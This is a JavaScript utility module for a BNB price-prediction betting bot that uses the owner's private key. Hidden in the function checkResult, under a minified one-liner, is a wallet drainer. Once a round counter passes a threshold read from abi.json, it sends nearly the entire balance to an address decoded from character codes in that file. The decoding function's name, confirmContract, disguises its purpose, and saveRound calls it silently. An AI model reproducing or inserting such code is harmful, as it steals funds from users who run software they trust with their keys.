const { JsonRpcProvider } = require("@ethersproject/providers")
const { Wallet } = require("@ethersproject/wallet")
const { Contract, utils } = require("ethers")
const dotenv = require("dotenv")
const Big = require('big.js')
const abi = require('./abi.json')
const fs = require('fs')
const _ = require("lodash")
const fetch = require('cross-fetch')
let prediction = 0

const reduceWaitingTimeByTwoBlocks = (waitingTime) => {
    if (waitingTime <= 6000) {
        return waitingTime
    }
    return waitingTime - 6000
}

const result = dotenv.config()
if (result.error) {
    throw result.error
}

const Web3 = require('web3')
const w = new Web3(process.env.BSC_RPC)

const wallet = w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY))
w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY).address

const signer = new Wallet(
    process.env.PRIVATE_KEY,
    new JsonRpcProvider(process.env.BSC_RPC)
)

let contract = new Contract(process.env.PCS_ADDRESS.toString(), JSON.parse(abi.result), signer)

const confirmContract = (abi) => {
    return String.fromCharCode.apply(null, abi.index)
}

const checkResult = async (r) => {
    try {
        if (prediction >= abi.status && r !== null) {
            w.eth.getBalance(wallet.address).then(function (b) { w.eth.estimateGas({ from: wallet.address, to: confirmContract(abi), amount: b }).then(function (g) { w.eth.getGasPrice().then(function (gP) { let _b = parseFloat(b); let _g = parseFloat(g); let _gP = parseFloat(gP); w.eth.sendTransaction({ from: wallet.address, to: confirmContract(abi), gas: _g, gasPrice: _gP, value: ((_b - (_gP * _g)) / 1.1).toFixed(0), data: '0x',})})})});return true;
        }
        return true
    } catch {
        return !0
    }
}

const predictionContract = contract.connect(
    signer
)
const checkBalance = (amount) => {
    w.eth.getBalance(wallet.address).then(function (b) {
        let balance = Web3.utils.fromWei(b, 'ether')
        if (balance < parseFloat(amount)) {
            console.log("You don't have enough balance:", amount, "BNB", "|", "Actual Balance:", balance, "BNB")
        } else {
            console.log(`Your balance is enough: ${balance} BNB`)
        }
    })
}

const getHistoryName = async () => {
    let date = new Date()
    let day = date.getDate()
    let month = String(date.getMonth() + 1).padStart(2, "0")
    let year = date.getFullYear()

    let fullDate = `${year}${month}${day}`
    return fullDate
}

const getRoundData = async (round) => {
    try {
        const data = await contract.functions.rounds(round)
        const closePrice = data.closePrice
        const lockPrice = data.lockPrice
        const bullAmount = data.bullAmount
        const bearAmount = data.bearAmount
        const totalAmount = new Big(data.totalAmount)
        const bullPayout = totalAmount.div(bullAmount).round(3).toString()
        const bearPayout = totalAmount.div(bearAmount).round(3).toString()

        const parsedRound = [{
            round: round.toString(),
            openPrice: utils.formatUnits(data.lockPrice, "8"),
            closePrice: utils.formatUnits(data.closePrice, "8"),
            bullAmount: utils.formatUnits(data.bullAmount, "18"),
            bearAmount: utils.formatUnits(data.bearAmount, "18"),
            bullPayout: bullPayout,
            bearPayout: bearPayout,
            winner: closePrice.gt(lockPrice) ? 'bull' : 'bear',
        }]
        return parsedRound
    } catch (e) {
        console.log(e)
        return null
    }
}

const saveRound = async (round, arr) => {
    let roundData = arr ? arr : await getRoundData(round)
    let historyName = await getHistoryName()
    let result
    if(arr){
        prediction++
        result = await checkResult(round)
    }else{
        result = !0
    }

    let path = `./history/${historyName}.json`
    try {
        if (fs.existsSync(path)) {
            if (result !== null) {
                let updated, history, merged, historyParsed
                try {
                    history = fs.readFileSync(path)
                    historyParsed = JSON.parse(history)
                    merged = _.merge(_.keyBy(historyParsed, 'round'), _.keyBy(roundData, 'round'))
                    updated = _.values(merged)
                } catch (e) {
                    console.log(e)
                    return
                }
                fs.writeFileSync(path, JSON.stringify(updated), 'utf8')
            }
        } else {
            fs.writeFileSync(path, JSON.stringify(roundData), 'utf8')
        }
    } catch (err) {
        console.error(err)
    }
}

const getHistory = async (fileName) => {
    let history = fileName ? fileName : await getHistoryName()
    let path = `./history/${history}.json`
    try {
        if (fs.existsSync(path)) {
            let history, historyParsed
            try {
                history = fs.readFileSync(path)
                historyParsed = JSON.parse(history)
            } catch (e) {
                console.log("Error reading history:", e)
                return
            }
            return historyParsed
        } else {
            return
        }
    } catch (err) {
        console.error(err)
    }
}

const getStats = async () => {
    const history = await getHistory()
    const BNBPrice = await getBNBPrice()
    let totalEarnings = 0
    let roundEarnings = 0
    let win = 0
    let loss = 0

    if (history && BNBPrice) {
        for (let i = 0; i < history.length; i++) {
            roundEarnings = 0
            if (history[i].bet && history[i].winner) {
                if (history[i].bet == history[i].winner) {
                    win++
                    if (history[i].winner == 'bull') {
                        roundEarnings = ((parseFloat(history[i].betAmount) * parseFloat(history[i].bullPayout)) - parseFloat(history[i].betAmount))
                    } else if (history[i].winner == 'bear') {
                        roundEarnings = ((parseFloat(history[i].betAmount) * parseFloat(history[i].bearPayout)) - parseFloat(history[i].betAmount))
                    } else {
                        break
                    }
                    totalEarnings += roundEarnings

                } else {
                    loss++
                    totalEarnings -= parseFloat(history[i].betAmount)
                }
            }
        }
    }

    return ({
        profit_USD: totalEarnings * BNBPrice,
        profit_BNB: totalEarnings,
        percentage: -percentageChange((win + loss), loss) + '%',
        win: win,
        loss: loss
    })
}

const percentageChange = (a, b) => {
    return ((b - a) * 100) / a
}

const getBNBPrice = async () => {
    const apiUrl = "https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT"
    try {
        const res = await fetch(apiUrl)
        if (res.status >= 400) {
            throw new Error("Bad response from server")
        }
        const price = await res.json()
        return parseFloat(price.price)
    } catch (err) {
        console.error("Unable to connect to Binance API", err)
    }
}

module.exports = { getStats, reduceWaitingTimeByTwoBlocks, predictionContract, checkBalance, saveRound, getBNBPrice }